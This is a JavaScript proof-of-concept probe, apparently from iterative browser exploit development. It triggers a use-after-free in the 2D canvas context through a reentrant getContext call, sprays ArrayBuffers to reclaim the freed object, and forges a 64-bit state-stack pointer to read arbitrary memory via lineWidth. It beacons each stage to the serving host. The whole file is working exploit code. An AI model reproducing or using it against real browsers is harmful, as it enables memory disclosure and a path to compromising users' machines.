// p494 — occupancy discriminator via save() marker + corrected 64-bit CAND forge.
//
// Fix vs p490/p493: candidates above 4 GB (0x7EF5A8000, 0x7EF000000,
// 0x7F0000000, 0x7E0000000) were forged with setUint32(low) + explicit high=0.
// DataView.setUint32 truncates, so the engine dereferenced the LOW 32 bits
// instead (e.g. 0x7EF5A8000 -> 0xEF5A8000). Those candidates were never tested.
// This probe writes the full 64-bit pointer.
//
// Layout (source-verified WK-1400):
//   m_stateStack header = object + 0x70   (m_buffer, m_capacity, m_size)
//   inline State         = object + 0x80
//   m_unrealizedSaveCount= object + 0x250  (Vector 0x1D0 + FloatRect 0x10)
//   State::lineWidth     = State + 48
// save() is ++m_unrealizedSaveCount (plain store, no deref): the occupancy marker.
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','TRIG','AB-SPRAY','SAVE','FORGED','LEAK','MISS','DONE','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V494-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) {
          staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
          return;
        }
    } catch (e) {}
  }

  // One candidate per load; the cursor advances before the risky read.
  var CANDS = [0x7EF5A8000, 0x7EF000000, 0x7F0000000, 0x10000000,
               0x30000000, 0x7E0000000, 0x50000000, 0x40000000];
  var idx = 0;
  try {
    idx = parseInt(localStorage.getItem('p494cand') || '0', 10);
    if (isNaN(idx) || idx < 0) idx = 0;
    if (idx >= CANDS.length) idx = CANDS.length - 1;
    localStorage.setItem('p494cand', String(idx + 1));
  } catch (e) {}
  var CAND = CANDS[idx];

  var caps = '';
  try { caps += ' idb=' + (typeof indexedDB); } catch (e) {}
  try { caps += ' oc=' + (typeof OffscreenCanvas); } catch (e) {}
  S('BOOT', 'cand=0x' + CAND.toString(16) + ' idx=' + idx + caps + ' ' + navigator.userAgent);

  // Proven trigger: reentrant 2d creation via the settings getter.
  var inner = null;
  var tc = document.createElement('canvas');
  var outer = tc.getContext('2d', {
    get desynchronized() { inner = tc.getContext('2d'); return false; }
  });
  S('TRIG', 'inner=' + (!!inner) + ' outer=' + (!!outer));
  if (!inner) { S('MISS', 'no-inner'); S('DONE', ''); return; }

  // First class-67 allocations after the free. Spray so a non-LIFO free list
  // still hands us the slot; zero each buffer so the marker scan is unambiguous.
  var N = 64, dvs = [];
  for (var i = 0; i < N; i++) {
    var ab = new ArrayBuffer(768);
    var dv = new DataView(ab);
    for (var o = 0; o + 4 <= 768; o += 4) dv.setUint32(o, 0, true);
    dvs.push(dv);
  }
  S('AB-SPRAY', 'n=' + N);

  // Deref-free occupancy marker. save() stores 1 at the occupant's +0x250.
  inner.save();
  var hit = -1, off = -1;
  scan:
  for (var i = 0; i < N; i++) {
    var dv = dvs[i];
    for (var o = 0; o + 4 <= 768; o += 4) {
      if (dv.getUint32(o, true) === 1) { hit = i; off = o; break scan; }
    }
  }
  if (hit < 0) { S('SAVE', 'miss'); S('MISS', 'ab-not-occupant'); S('DONE', ''); return; }
  S('SAVE', 'hit i=' + hit + ' off=0x' + off.toString(16));

  // Canonical offsets: 0x250 release, 0x258 if ASSERT_ENABLED shifted the layout.
  if (off !== 0x250 && off !== 0x258) { S('MISS', 'odd-off'); S('DONE', ''); return; }

  // m_stateStack header = save offset - 0x1E0.
  var h = off - 0x1E0;
  var dv = dvs[hit];
  dv.setUint32(h, CAND >>> 0, true);                       // m_buffer low 32
  dv.setUint32(h + 4, Math.floor(CAND / 4294967296), true); // m_buffer high 32
  dv.setUint32(h + 8, 1, true);                             // m_capacity
  dv.setUint32(h + 12, 1, true);                            // m_size
  S('FORGED', 'h=0x' + h.toString(16) + ' cand=0x' + CAND.toString(16));

  // One dereference: lineWidth = double at CAND + 48.
  var v = inner.lineWidth;
  var f = new ArrayBuffer(8), fv = new DataView(f);
  fv.setFloat64(0, v, true);
  var lo = fv.getUint32(0, true), hi = fv.getUint32(4, true);
  S('LEAK', 'lineWidth=' + v + ' bits=0x' + hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
  S('DONE', 'gadget-ok');
})();
